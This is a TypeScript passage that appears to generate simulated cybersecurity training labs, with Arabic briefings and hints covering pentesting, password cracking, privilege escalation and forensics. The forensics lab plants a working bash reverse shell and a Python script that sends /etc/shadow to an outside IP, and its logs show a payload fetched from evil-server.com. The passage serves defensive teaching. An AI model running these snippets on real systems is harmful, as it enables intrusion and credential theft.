    description: "Kali Linux attack machine with full pentesting toolkit",
    descriptionAr: "جهاز Kali Linux مع أدوات اختبار الاختراق الكاملة",
    icon: "🐧", processes: makeProcesses("kali", [makeSSHService()]),
    env: { HOME: "/home/kali", USER: "kali", SHELL: "/bin/bash", PATH: "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin", TERM: "xterm-256color" },
  };

  const target: VirtualMachine = {
    id: "target-1", hostname: "target-server", ip: "192.168.1.50", mac: randomMAC(),
    os: "ubuntu-server", osLabel: "Ubuntu Server 22.04 LTS", role: "target",
    users: [
      { username: "root", password: "toor123", isRoot: true, home: "/root", shell: "/bin/bash", groups: ["root"], uid: 0 },
      { username: "admin", password: "s3rv3r_2024!", isRoot: false, home: "/home/admin", shell: "/bin/bash", groups: ["admin", "sudo", "www-data"], uid: 1000 },
      { username: "user1", password: "password123", isRoot: false, home: "/home/user1", shell: "/bin/bash", groups: ["user1"], uid: 1001 },
    ],
    currentUser: "admin",
    filesystem: buildUbuntuServerFS("target-server", "192.168.1.50", networkHosts, targetServices),
    services: targetServices,
    tools: [],
    isAccessible: false,
    description: "Ubuntu target server running SSH, HTTP, FTP, MySQL",
    descriptionAr: "خادم Ubuntu الهدف مع خدمات SSH, HTTP, FTP, MySQL",
    icon: "🖥️", processes: makeProcesses("ubuntu", targetServices),
    env: { HOME: "/home/admin", USER: "admin", SHELL: "/bin/bash", PATH: "/usr/local/bin:/usr/bin:/bin", TERM: "xterm-256color" },
  };

  return {
    id: genId(), name: "Linux Penetration Testing Lab", nameAr: "مختبر اختبار اختراق Linux",
    description: "Full penetration testing lab with Kali attacker and vulnerable Ubuntu target server",
    briefing: `🔴 مرحباً بك في مختبر اختبار الاختراق!\n\n📋 المهمة:\nأمامك شبكة تحتوي على جهازين:\n\n🐧 جهازك (Kali Linux) - IP: 192.168.1.100\n  └ مجهز بأدوات الاختراق الكاملة\n\n🖥️ الخادم الهدف (Ubuntu) - IP: 192.168.1.50\n  └ يعمل عليه عدة خدمات\n\n🎯 أهدافك:\n1. اكتشف الخدمات المفتوحة على الهدف (nmap)\n2. ابحث عن نقاط الضعف\n3. اخترق الخادم واحصل على صلاحيات\n4. ابحث عن الأعلام (FLAGS) المخفية\n\n💡 ابدأ بـ: nmap -sV 192.168.1.50\n\n⚡ حظاً موفقاً يا بطل!`,
    objectives: [
      "اكتشف المنافذ والخدمات المفتوحة على الهدف",
      "استخدم أدوات الاستطلاع لجمع المعلومات",
      "اعثر على بيانات الدخول الضعيفة",
      "ادخل إلى الخادم عبر SSH",
      "صعّد صلاحياتك للوصول إلى root",
      "اعثر على جميع الأعلام (FLAGS) المخفية",
    ],
    hints: [
      "جرّب: nmap -sV -sC 192.168.1.50 لمسح شامل",
      "خدمة FTP قد تسمح بالدخول المجهول (anonymous)",
      "ابحث عن ملفات النسخ الاحتياطي في الويب",
      "كلمات المرور الضعيفة شائعة — جرّب hydra",
    ],
    network, machines: [attacker, target],
    difficulty: req.difficulty || "intermediate", category: "offensive",
    createdBy: "student", createdAt: Date.now(),
  };
}

function buildWindowsPentestEnv(req: EnvironmentSetupRequest, network: { subnet: string; netmask: string; gateway: string; dns: string }): CyberEnvironment {
  const machinesInfo = [
    { hostname: "kali-attacker", ip: "192.168.1.100" },
    { hostname: "win-target", ip: "192.168.1.50" },
  ];
  const networkHosts = buildNetworkHosts(machinesInfo);

  const winServices: VMService[] = [makeSMBService(), makeRDPService(), makeHTTPService("Microsoft-IIS/10.0", ["Default IIS page exposed", "web.config readable"])];
  winServices.push({ name: "ssh", port: 22, protocol: "tcp", version: "OpenSSH for Windows 8.1", running: true, banner: "SSH-2.0-OpenSSH_for_Windows_8.1", vulnerabilities: [] });

  const attacker: VirtualMachine = {
    id: "kali-1", hostname: "kali-attacker", ip: "192.168.1.100", mac: randomMAC(),
    os: "kali-linux", osLabel: "Kali Linux 2024.1", role: "attacker",
    users: [
      { username: "kali", password: "kali", isRoot: false, home: "/home/kali", shell: "/bin/bash", groups: ["kali", "sudo"], uid: 1000 },
      { username: "root", password: "toor", isRoot: true, home: "/root", shell: "/bin/bash", groups: ["root"], uid: 0 },
    ],
    currentUser: "kali", filesystem: buildKaliFS("kali-attacker", "192.168.1.100", networkHosts),
    services: [makeSSHService()], tools: ["nmap", "hydra", "john", "hashcat", "gobuster", "nikto", "sqlmap", "netcat", "curl", "wget", "smbclient", "enum4linux", "crackmapexec"],
    isAccessible: true, description: "Kali Linux attacker", descriptionAr: "جهاز المهاجم - Kali Linux",
    icon: "🐧", processes: makeProcesses("kali", [makeSSHService()]),
    env: { HOME: "/home/kali", USER: "kali", SHELL: "/bin/bash", PATH: "/usr/local/bin:/usr/bin:/bin", TERM: "xterm-256color" },
  };

  const winTarget: VirtualMachine = {
    id: "win-1", hostname: "win-target", ip: "192.168.1.50", mac: randomMAC(),
    os: "windows-10", osLabel: "Windows 10 Pro Build 19045", role: "target",
    users: [
      { username: "Administrator", password: "P@ssw0rd123!", isRoot: true, home: "C:\\Users\\Administrator", shell: "cmd.exe", groups: ["Administrators"], uid: 500 },
      { username: "guest", password: "guest", isRoot: false, home: "C:\\Users\\guest", shell: "cmd.exe", groups: ["Guests"], uid: 501 },
    ],
    currentUser: "Administrator", filesystem: buildWindowsFS("win-target", "192.168.1.50"),
    services: winServices, tools: [],
    isAccessible: false, description: "Windows 10 target", descriptionAr: "جهاز Windows 10 الهدف",
    icon: "🪟", processes: makeProcesses("windows", winServices),
    env: { USERPROFILE: "C:\\Users\\Administrator", USERNAME: "Administrator", COMSPEC: "C:\\Windows\\System32\\cmd.exe", SystemRoot: "C:\\Windows" },
  };

  return {
    id: genId(), name: "Windows Penetration Testing Lab", nameAr: "مختبر اختبار اختراق Windows",
    description: "Kali Linux attacker targeting a Windows 10 machine",
    briefing: `🪟 مرحباً بك في مختبر اختراق Windows!\n\n📋 المهمة:\nأمامك شبكة تحتوي على:\n\n🐧 جهازك (Kali) - IP: 192.168.1.100\n🪟 جهاز Windows الهدف - IP: 192.168.1.50\n\n🎯 أهدافك:\n1. امسح الهدف واكتشف خدمات SMB/RDP/HTTP\n2. حاول الوصول عبر مشاركات SMB\n3. اكسر كلمة المرور وادخل عبر SSH\n4. استكشف النظام وابحث عن البيانات الحساسة\n\n💡 ابدأ بـ: nmap -sV --script=smb-vuln* 192.168.1.50\n\n⚡ هجوم ناجح يبدأ باستطلاع دقيق!`,
    objectives: [
      "اكتشف خدمات Windows المفتوحة (SMB, RDP, IIS)",
      "تحقق من ثغرة EternalBlue (MS17-010)",
      "استكشف مشاركات SMB المتاحة",
      "احصل على بيانات الدخول واخترق النظام",
      "اعثر على الملفات الحساسة والأعلام",
    ],
    hints: [
      "SMB غالباً يسمح بدخول Guest",
      "ملف web.config في IIS قد يحتوي كلمات مرور",
      "ابحث في مجلد Desktop للمسؤول",
      "جرّب: nmap --script smb-enum-shares 192.168.1.50",
    ],
    network, machines: [attacker, winTarget],
    difficulty: req.difficulty || "intermediate", category: "offensive",
    createdBy: "student", createdAt: Date.now(),
  };
}

function buildWebSecurityEnv(req: EnvironmentSetupRequest, network: { subnet: string; netmask: string; gateway: string; dns: string }): CyberEnvironment {
  const machinesInfo = [
    { hostname: "kali-attacker", ip: "192.168.1.100" },
    { hostname: "web-server", ip: "192.168.1.50" },
    { hostname: "db-server", ip: "192.168.1.51" },
  ];
  const networkHosts = buildNetworkHosts(machinesInfo);

  const webServices: VMService[] = [makeSSHService(), makeHTTPService("Apache httpd 2.4.52", ["SQL Injection", "XSS", "Directory Traversal", "File Upload Bypass", "Insecure Direct Object Reference"])];
  const dbServices: VMService[] = [makeSSHService(), makeMySQLService()];

  const attacker: VirtualMachine = {
    id: "kali-1", hostname: "kali-attacker", ip: "192.168.1.100", mac: randomMAC(),
    os: "kali-linux", osLabel: "Kali Linux 2024.1", role: "attacker",
    users: [
      { username: "kali", password: "kali", isRoot: false, home: "/home/kali", shell: "/bin/bash", groups: ["kali", "sudo"], uid: 1000 },
      { username: "root", password: "toor", isRoot: true, home: "/root", shell: "/bin/bash", groups: ["root"], uid: 0 },
    ],
    currentUser: "kali", filesystem: buildKaliFS("kali-attacker", "192.168.1.100", networkHosts),
    services: [makeSSHService()], tools: ["nmap", "nikto", "gobuster", "dirb", "sqlmap", "curl", "wget", "hydra", "burpsuite", "wfuzz"],
    isAccessible: true, description: "Kali Linux web pentester", descriptionAr: "جهاز المهاجم لاختبار تطبيقات الويب",
    icon: "🐧", processes: makeProcesses("kali", [makeSSHService()]),
    env: { HOME: "/home/kali", USER: "kali", SHELL: "/bin/bash", PATH: "/usr/local/bin:/usr/bin:/bin", TERM: "xterm-256color" },
  };

  const webServer: VirtualMachine = {
    id: "web-1", hostname: "web-server", ip: "192.168.1.50", mac: randomMAC(),
    os: "ubuntu-server", osLabel: "Ubuntu Server 22.04 LTS", role: "server",
    users: [
      { username: "root", password: "w3bR00t!", isRoot: true, home: "/root", shell: "/bin/bash", groups: ["root"], uid: 0 },
      { username: "www-admin", password: "webadmin2024", isRoot: false, home: "/home/www-admin", shell: "/bin/bash", groups: ["www-admin", "www-data"], uid: 1000 },
    ],
    currentUser: "www-admin", filesystem: buildUbuntuServerFS("web-server", "192.168.1.50", networkHosts, webServices),
    services: webServices, tools: [],
    isAccessible: false, description: "Web server with vulnerable application", descriptionAr: "خادم الويب مع تطبيق به ثغرات",
    icon: "🌐", processes: makeProcesses("ubuntu", webServices),
    env: { HOME: "/home/www-admin", USER: "www-admin", SHELL: "/bin/bash", PATH: "/usr/local/bin:/usr/bin:/bin", TERM: "xterm-256color" },
  };

  const dbServer: VirtualMachine = {
    id: "db-1", hostname: "db-server", ip: "192.168.1.51", mac: randomMAC(),
    os: "ubuntu-server", osLabel: "Ubuntu Server 22.04 LTS", role: "server",
    users: [
      { username: "root", password: "dBr00t!2024", isRoot: true, home: "/root", shell: "/bin/bash", groups: ["root"], uid: 0 },
      { username: "dbadmin", password: "mysql_r00t_p@ss", isRoot: false, home: "/home/dbadmin", shell: "/bin/bash", groups: ["dbadmin"], uid: 1000 },
    ],
    currentUser: "dbadmin", filesystem: buildUbuntuServerFS("db-server", "192.168.1.51", networkHosts, dbServices),
    services: dbServices, tools: [],
    isAccessible: false, description: "Database server", descriptionAr: "خادم قاعدة البيانات",
    icon: "🗄️", processes: makeProcesses("ubuntu", dbServices),
    env: { HOME: "/home/dbadmin", USER: "dbadmin", SHELL: "/bin/bash", PATH: "/usr/local/bin:/usr/bin:/bin", TERM: "xterm-256color" },
  };

  return {
    id: genId(), name: "Web Application Security Lab", nameAr: "مختبر أمن تطبيقات الويب",
    description: "Web app pentesting with vulnerable web server and database",
    briefing: `🌐 مرحباً بك في مختبر أمن تطبيقات الويب!\n\n📋 المهمة:\nأمامك بنية تحتية ويب كاملة:\n\n🐧 جهازك (Kali) - 192.168.1.100\n🌐 خادم الويب - 192.168.1.50 (Apache + PHP)\n🗄️ خادم قاعدة البيانات - 192.168.1.51 (MySQL)\n\n🎯 أهدافك:\n1. اكتشف صفحات الويب المخفية (gobuster)\n2. اختبر ثغرات SQL Injection\n3. ابحث عن ملفات النسخ الاحتياطي المكشوفة\n4. احصل على بيانات قاعدة البيانات\n5. اخترق خادم الويب ثم انتقل لقاعدة البيانات\n\n💡 ابدأ بـ: curl http://192.168.1.50\n\n⚡ الويب مليء بالأسرار لمن يعرف أين يبحث!`,
    objectives: [
      "اكتشف المجلدات والملفات المخفية في الويب",
      "اختبر ثغرة SQL Injection في صفحة الدخول",
      "استخرج بيانات المستخدمين من قاعدة البيانات",
      "اعثر على ملف النسخ الاحتياطي المكشوف",
      "ادخل إلى خادم الويب وانتقل إلى خادم قاعدة البيانات",
    ],
    hints: [
      "جرّب: gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/common-passwords.txt",
      "صفحة /admin/login.php قد تكون عرضة لـ SQL Injection",
      "ابحث عن /backup/ — قد يحتوي نسخة من قاعدة البيانات",
      "ملف config.php قد يحتوي بيانات الاتصال بقاعدة البيانات",
    ],
    network, machines: [attacker, webServer, dbServer],
    difficulty: req.difficulty || "intermediate", category: "offensive",
    createdBy: "student", createdAt: Date.now(),
  };
}

function buildNetworkAnalysisEnv(req: EnvironmentSetupRequest, network: { subnet: string; netmask: string; gateway: string; dns: string }): CyberEnvironment {
  const machinesInfo = [
    { hostname: "analyst-ws", ip: "192.168.1.100" },
    { hostname: "web-server", ip: "192.168.1.50" },
    { hostname: "mail-server", ip: "192.168.1.51" },
    { hostname: "dns-server", ip: "192.168.1.52" },
  ];
  const networkHosts = buildNetworkHosts(machinesInfo);

  const webSvcs: VMService[] = [makeSSHService(), makeHTTPService()];
  const mailSvcs: VMService[] = [makeSSHService(), makeSMTPService()];
  const dnsSvcs: VMService[] = [makeSSHService(), makeDNSService()];

  const analyst: VirtualMachine = {
    id: "analyst-1", hostname: "analyst-ws", ip: "192.168.1.100", mac: randomMAC(),
    os: "ubuntu-desktop", osLabel: "Ubuntu Desktop 22.04", role: "workstation",
    users: [{ username: "analyst", password: "analyst", isRoot: false, home: "/home/analyst", shell: "/bin/bash", groups: ["analyst", "sudo", "wireshark"], uid: 1000 },
            { username: "root", password: "toor", isRoot: true, home: "/root", shell: "/bin/bash", groups: ["root"], uid: 0 }],
    currentUser: "analyst", filesystem: buildKaliFS("analyst-ws", "192.168.1.100", networkHosts),
    services: [makeSSHService()], tools: ["nmap", "tcpdump", "wireshark", "tshark", "netcat", "curl", "wget", "traceroute", "dig", "whois"],
    isAccessible: true, description: "Network analyst workstation", descriptionAr: "محطة عمل محلل الشبكات",
    icon: "📡", processes: makeProcesses("ubuntu", [makeSSHService()]),
    env: { HOME: "/home/analyst", USER: "analyst", SHELL: "/bin/bash", PATH: "/usr/local/bin:/usr/bin:/bin", TERM: "xterm-256color" },
  };

  const createServer = (id: string, hostname: string, ip: string, label: string, svcs: VMService[], desc: string, descAr: string, icon: string): VirtualMachine => ({
    id, hostname, ip, mac: randomMAC(), os: "ubuntu-server", osLabel: "Ubuntu Server 22.04", role: "server",
    users: [{ username: "root", password: "serverRoot!", isRoot: true, home: "/root", shell: "/bin/bash", groups: ["root"], uid: 0 },
            { username: "sysadmin", password: "admin2024", isRoot: false, home: "/home/sysadmin", shell: "/bin/bash", groups: ["sysadmin", "sudo"], uid: 1000 }],
    currentUser: "sysadmin", filesystem: buildUbuntuServerFS(hostname, ip, networkHosts, svcs),
    services: svcs, tools: [], isAccessible: false, description: desc, descriptionAr: descAr,
    icon, processes: makeProcesses("ubuntu", svcs),
    env: { HOME: "/home/sysadmin", USER: "sysadmin", SHELL: "/bin/bash", PATH: "/usr/local/bin:/usr/bin:/bin", TERM: "xterm-256color" },
  });

  return {
    id: genId(), name: "Network Analysis Lab", nameAr: "مختبر تحليل الشبكات",
    description: "Multiple servers for network traffic analysis",
    briefing: `📡 مرحباً بك في مختبر تحليل الشبكات!\n\n📋 المهمة:\nأمامك شبكة كاملة مكونة من 4 أجهزة:\n\n📡 محطة التحليل - 192.168.1.100\n🌐 خادم الويب - 192.168.1.50\n📧 خادم البريد - 192.168.1.51\n🔤 خادم DNS - 192.168.1.52\n\n🎯 أهدافك:\n1. اكتشف جميع الأجهزة والخدمات في الشبكة\n2. حلّل حركة المرور بين الأجهزة\n3. اكتشف أي نشاط مشبوه\n4. حدد نقاط الضعف في البنية التحتية\n\n💡 ابدأ بـ: nmap -sV 192.168.1.0/24\n\n⚡ المحلل الجيد يرى ما لا يراه الآخرون!`,
    objectives: [
      "اكتشف جميع الأجهزة في الشبكة",
      "حدد الخدمات المفتوحة على كل جهاز",
      "حلّل سجلات DNS للعثور على طلبات مشبوهة",
      "تحقق من إعدادات خادم البريد (SMTP Open Relay)",
      "قيّم الوضع الأمني العام للشبكة",
    ],
    hints: [
      "nmap -sV 192.168.1.0/24 سيكشف جميع الأجهزة",
      "خادم DNS قد يسمح بنقل المنطقة (Zone Transfer)",
      "خادم البريد قد يكون Open Relay",
      "تحقق من سجلات auth.log على كل خادم",
    ],
    network, machines: [
      analyst,
      createServer("web-1", "web-server", "192.168.1.50", "Ubuntu Server 22.04", webSvcs, "Web server", "خادم الويب", "🌐"),
      createServer("mail-1", "mail-server", "192.168.1.51", "Ubuntu Server 22.04", mailSvcs, "Mail server", "خادم البريد", "📧"),
      createServer("dns-1", "dns-server", "192.168.1.52", "Ubuntu Server 22.04", dnsSvcs, "DNS server", "خادم DNS", "🔤"),
    ],
    difficulty: req.difficulty || "intermediate", category: "defensive",
    createdBy: "student", createdAt: Date.now(),
  };
}

function buildPasswordCrackingEnv(req: EnvironmentSetupRequest, network: { subnet: string; netmask: string; gateway: string; dns: string }): CyberEnvironment {
  const machinesInfo = [
    { hostname: "kali-cracker", ip: "192.168.1.100" },
    { hostname: "target-ssh", ip: "192.168.1.50" },
    { hostname: "target-web", ip: "192.168.1.51" },
  ];
  const networkHosts = buildNetworkHosts(machinesInfo);

  const sshTarget: VirtualMachine = {
    id: "ssh-target", hostname: "target-ssh", ip: "192.168.1.50", mac: randomMAC(),
    os: "ubuntu-server", osLabel: "Ubuntu Server 22.04", role: "target",
    users: [
      { username: "root", password: "shadow", isRoot: true, home: "/root", shell: "/bin/bash", groups: ["root"], uid: 0 },
      { username: "admin", password: "letmein", isRoot: false, home: "/home/admin", shell: "/bin/bash", groups: ["admin", "sudo"], uid: 1000 },
      { username: "user", password: "123456", isRoot: false, home: "/home/user", shell: "/bin/bash", groups: ["user"], uid: 1001 },
      { username: "developer", password: "qwerty", isRoot: false, home: "/home/developer", shell: "/bin/bash", groups: ["developer"], uid: 1002 },
    ],
    currentUser: "admin",
    filesystem: buildUbuntuServerFS("target-ssh", "192.168.1.50", networkHosts, [makeSSHService()]),
    services: [makeSSHService()], tools: [],
    isAccessible: false, description: "SSH server with weak passwords", descriptionAr: "خادم SSH بكلمات مرور ضعيفة",
    icon: "🔑", processes: makeProcesses("ubuntu", [makeSSHService()]),
    env: { HOME: "/home/admin", USER: "admin", SHELL: "/bin/bash", PATH: "/usr/local/bin:/usr/bin:/bin", TERM: "xterm-256color" },
  };

  const webTarget: VirtualMachine = {
    id: "web-target", hostname: "target-web", ip: "192.168.1.51", mac: randomMAC(),
    os: "ubuntu-server", osLabel: "Ubuntu Server 22.04", role: "target",
    users: [
      { username: "root", password: "toor", isRoot: true, home: "/root", shell: "/bin/bash", groups: ["root"], uid: 0 },
      { username: "webadmin", password: "password1", isRoot: false, home: "/home/webadmin", shell: "/bin/bash", groups: ["webadmin"], uid: 1000 },
    ],
    currentUser: "webadmin",
    filesystem: buildUbuntuServerFS("target-web", "192.168.1.51", networkHosts, [makeSSHService(), makeHTTPService()]),
    services: [makeSSHService(), makeHTTPService()], tools: [],
    isAccessible: false, description: "Web server with weak authentication", descriptionAr: "خادم ويب بمصادقة ضعيفة",
    icon: "🌐", processes: makeProcesses("ubuntu", [makeSSHService(), makeHTTPService()]),
    env: { HOME: "/home/webadmin", USER: "webadmin", SHELL: "/bin/bash", PATH: "/usr/local/bin:/usr/bin:/bin", TERM: "xterm-256color" },
  };

  const attacker: VirtualMachine = {
    id: "kali-1", hostname: "kali-cracker", ip: "192.168.1.100", mac: randomMAC(),
    os: "kali-linux", osLabel: "Kali Linux 2024.1", role: "attacker",
    users: [
      { username: "kali", password: "kali", isRoot: false, home: "/home/kali", shell: "/bin/bash", groups: ["kali", "sudo"], uid: 1000 },
      { username: "root", password: "toor", isRoot: true, home: "/root", shell: "/bin/bash", groups: ["root"], uid: 0 },
    ],
    currentUser: "kali", filesystem: buildKaliFS("kali-cracker", "192.168.1.100", networkHosts),
    services: [makeSSHService()], tools: ["nmap", "hydra", "john", "hashcat", "medusa", "ncrack", "curl", "wget"],
    isAccessible: true, description: "Kali Linux password cracker", descriptionAr: "جهاز Kali لكسر كلمات المرور",
    icon: "🐧", processes: makeProcesses("kali", [makeSSHService()]),
    env: { HOME: "/home/kali", USER: "kali", SHELL: "/bin/bash", PATH: "/usr/local/bin:/usr/bin:/bin", TERM: "xterm-256color" },
  };

  return {
    id: genId(), name: "Password Cracking Lab", nameAr: "مختبر كسر كلمات المرور",
    description: "Practice password cracking with multiple targets",
    briefing: `🔑 مرحباً بك في مختبر كسر كلمات المرور!\n\n📋 المهمة:\nأمامك هدفان بكلمات مرور ضعيفة:\n\n🐧 جهازك (Kali) - 192.168.1.100\n🔑 خادم SSH - 192.168.1.50 (4 مستخدمين)\n🌐 خادم الويب - 192.168.1.51 (HTTP + SSH)\n\n🎯 أهدافك:\n1. اكسر كلمات مرور SSH باستخدام hydra\n2. جرّب هجوم القاموس على مستخدمين مختلفين\n3. اكسر تجزئات الملف shadow بـ john\n4. ادخل كل الخوادم واعثر على الأعلام\n\n💡 ابدأ بـ: hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50\n\n⚡ كلمة مرور ضعيفة = باب مفتوح!`,
    objectives: [
      "اكسر كلمة مرور SSH للمستخدم admin",
      "اكتشف جميع المستخدمين وكلمات مرورهم",
      "ادخل إلى خادم الويب",
      "استخرج ملف shadow واكسر التجزئات",
    ],
    hints: [
      "ملف rockyou.txt موجود في /usr/share/wordlists/",
      "جرّب مستخدمين مختلفين: admin, user, root, developer",
      "بعد الدخول، ابحث عن ملف shadow في /etc/",
      "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
    ],
    network, machines: [attacker, sshTarget, webTarget],
    difficulty: req.difficulty || "beginner", category: "offensive",
    createdBy: "student", createdAt: Date.now(),
  };
}

function buildPrivilegeEscalationEnv(req: EnvironmentSetupRequest, network: { subnet: string; netmask: string; gateway: string; dns: string }): CyberEnvironment {
  const machinesInfo = [{ hostname: "target-box", ip: "192.168.1.50" }];
  const networkHosts = buildNetworkHosts(machinesInfo);

  const targetFS = buildUbuntuServerFS("target-box", "192.168.1.50", networkHosts, [makeSSHService(), makeHTTPService()]);
  if (targetFS.children?.usr?.children) {
    targetFS.children.usr.children["local"] = {
      type: "dir", children: {
        bin: { type: "dir", children: {
          "backup.sh": { type: "file", content: "#!/bin/bash\n# This script runs as root via cron\ntar -czf /tmp/backup.tar.gz /var/www/html/\nchmod 777 /tmp/backup.tar.gz", executable: true, owner: "root", permissions: "-rwxr-xr-x" },
          "health-check": { type: "file", content: "#!/bin/bash\ncurl -s http://localhost/health\nexit 0", executable: true, owner: "root", permissions: "-rwsr-xr-x" },
        }}
      }
    };
  }

  const target: VirtualMachine = {
    id: "target-1", hostname: "target-box", ip: "192.168.1.50", mac: randomMAC(),
    os: "ubuntu-server", osLabel: "Ubuntu Server 22.04 LTS", role: "target",
    users: [
      { username: "root", password: "ultra_s3cur3_r00t!", isRoot: true, home: "/root", shell: "/bin/bash", groups: ["root"], uid: 0 },
      { username: "lowuser", password: "lowuser123", isRoot: false, home: "/home/lowuser", shell: "/bin/bash", groups: ["lowuser"], uid: 1000 },
    ],
    currentUser: "lowuser", filesystem: targetFS,
    services: [makeSSHService(), makeHTTPService()], tools: [],
    isAccessible: true, description: "Target with privilege escalation vectors", descriptionAr: "نظام بصلاحيات محدودة — هدفك الوصول لـ root",
    icon: "⬆️", processes: makeProcesses("ubuntu", [makeSSHService(), makeHTTPService()]),
    env: { HOME: "/home/lowuser", USER: "lowuser", SHELL: "/bin/bash", PATH: "/usr/local/bin:/usr/bin:/bin", TERM: "xterm-256color" },
  };

  return {
    id: genId(), name: "Privilege Escalation Lab", nameAr: "مختبر تصعيد الصلاحيات",
    description: "Start as low-privilege user and escalate to root",
    briefing: `⬆️ مرحباً بك في مختبر تصعيد الصلاحيات!\n\n📋 المهمة:\nأنت داخل النظام كمستخدم عادي بصلاحيات محدودة:\n\n⬆️ النظام الهدف - 192.168.1.50\n👤 المستخدم: lowuser (صلاحيات محدودة)\n\n🎯 هدفك الوحيد: الوصول إلى صلاحيات root!\n\nابحث عن:\n- ملفات SUID\n- مهام cron تعمل كـ root\n- إعدادات sudo خاطئة\n- كلمات مرور مخزنة في ملفات النظام\n- سكربتات قابلة للتعديل تعمل بصلاحيات عالية\n\n💡 ابدأ بـ: find / -perm -4000 2>/dev/null\n\n⚡ الطريق إلى root يبدأ بملاحظة صغيرة!`,
    objectives: [
      "ابحث عن ملفات SUID على النظام",
      "اكتشف مهام cron التي تعمل كـ root",
      "استغل أحد متجهات التصعيد للحصول على root",
      "اعثر على العلم في /root/FLAG.txt",
    ],
    hints: [
      "find / -perm -4000 يبحث عن ملفات SUID",
      "cat /etc/crontab يعرض مهام cron",
      "ابحث عن سكربتات يمكنك تعديلها وتعمل كـ root",
      "/usr/local/bin/health-check يحتوي SUID bit",
    ],
    network, machines: [target],
    difficulty: req.difficulty || "advanced", category: "offensive",
    createdBy: "student", createdAt: Date.now(),
  };
}

function buildForensicsEnv(req: EnvironmentSetupRequest, network: { subnet: string; netmask: string; gateway: string; dns: string }): CyberEnvironment {
  const machinesInfo = [{ hostname: "compromised-srv", ip: "192.168.1.50" }];
  const networkHosts = buildNetworkHosts(machinesInfo);

  const compFS = buildUbuntuServerFS("compromised-srv", "192.168.1.50", networkHosts, [makeSSHService(), makeHTTPService()]);
  if (compFS.children?.var?.children?.log?.children) {
    compFS.children.var.children.log.children["auth.log"] = {
      type: "file", content: `Jan 14 22:00:01 compromised-srv sshd[1001]: Failed password for root from 45.33.32.156 port 44320 ssh2
Jan 14 22:00:03 compromised-srv sshd[1001]: Failed password for root from 45.33.32.156 port 44320 ssh2
Jan 14 22:00:05 compromised-srv sshd[1001]: Failed password for root from 45.33.32.156 port 44320 ssh2
Jan 14 22:00:07 compromised-srv sshd[1001]: Failed password for admin from 45.33.32.156 port 44320 ssh2
Jan 14 22:00:09 compromised-srv sshd[1001]: Accepted password for admin from 45.33.32.156 port 44320 ssh2
Jan 14 22:01:15 compromised-srv sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
Jan 14 22:02:30 compromised-srv sshd[1234]: Received disconnect from 45.33.32.156 port 44320:11: disconnected by user
Jan 14 23:00:00 compromised-srv sshd[2001]: Accepted publickey for root from 45.33.32.156 port 55100 ssh2
Jan 14 23:05:00 compromised-srv su: (to root) root on pts/1
Jan 15 01:00:00 compromised-srv CRON[3001]: (root) CMD (/tmp/.hidden/backdoor.sh)
Jan 15 03:00:00 compromised-srv CRON[3002]: (root) CMD (/tmp/.hidden/backdoor.sh)
Jan 15 05:00:00 compromised-srv CRON[3003]: (root) CMD (/tmp/.hidden/backdoor.sh)`
    };
    compFS.children.var.children.log.children["syslog"] = {
      type: "file", content: `Jan 14 22:01:20 compromised-srv kernel: [WARNING] New kernel module loaded: rootkit.ko
Jan 14 22:01:25 compromised-srv systemd[1]: Started Reverse Shell Service
Jan 14 22:02:00 compromised-srv wget: Downloaded: http://evil-server.com/payload.sh -> /tmp/.hidden/backdoor.sh
Jan 14 22:02:05 compromised-srv crontab: (root) NEW cron job: */2 * * * * /tmp/.hidden/backdoor.sh
Jan 14 22:02:10 compromised-srv bash: History cleared by root
Jan 15 00:00:00 compromised-srv sshd[1500]: Server listening on 0.0.0.0 port 22
Jan 15 00:00:00 compromised-srv sshd[1500]: Server listening on 0.0.0.0 port 4444`
    };
  }
  if (compFS.children?.tmp) {
    compFS.children.tmp.children = {
      ".hidden": { type: "dir", children: {
        "backdoor.sh": { type: "file", content: "#!/bin/bash\n/bin/bash -i >& /dev/tcp/45.33.32.156/4444 0>&1", executable: true },
        "exfil.py": { type: "file", content: "#!/usr/bin/env python3\nimport socket\nimport os\ndef exfiltrate():\n    data = open('/etc/shadow').read()\n    s = socket.socket()\n    s.connect(('45.33.32.156', 8888))\n    s.send(data.encode())\n    s.close()\nexfiltrate()" },
        "keylogger.log": { type: "file", content: "[2024-01-14 22:30:00] admin typed: sudo su -\n[2024-01-14 22:30:05] root typed: cat /etc/shadow\n[2024-01-14 22:31:00] root typed: mysql -u root -pmysql_r00t_p@ss\n[2024-01-14 22:35:00] root typed: scp /var/www/html/backup.zip admin@192.168.1.200:/tmp/" },
      }},
    };
  }

  const compromised: VirtualMachine = {
    id: "comp-1", hostname: "compromised-srv", ip: "192.168.1.50", mac: randomMAC(),
    os: "ubuntu-server", osLabel: "Ubuntu Server 22.04 LTS", role: "target",
    users: [
      { username: "root", password: "toor123", isRoot: true, home: "/root", shell: "/bin/bash", groups: ["root"], uid: 0 },
      { username: "forensic", password: "forensic", isRoot: false, home: "/home/forensic", shell: "/bin/bash", groups: ["forensic", "sudo"], uid: 1000 },
    ],
    currentUser: "forensic", filesystem: compFS,
    services: [makeSSHService(), makeHTTPService()], tools: ["strings", "file", "xxd", "md5sum", "sha256sum", "find", "grep", "awk", "sed", "last", "lastlog", "who"],
    isAccessible: true, description: "Compromised server for forensic analysis", descriptionAr: "خادم مخترق للتحليل الجنائي الرقمي",
    icon: "🔍", processes: makeProcesses("ubuntu", [makeSSHService(), makeHTTPService()]),
    env: { HOME: "/home/forensic", USER: "forensic", SHELL: "/bin/bash", PATH: "/usr/local/bin:/usr/bin:/bin", TERM: "xterm-256color" },
  };

  return {
    id: genId(), name: "Digital Forensics Lab", nameAr: "مختبر التحليل الجنائي الرقمي",
    description: "Analyze a compromised server to find evidence",
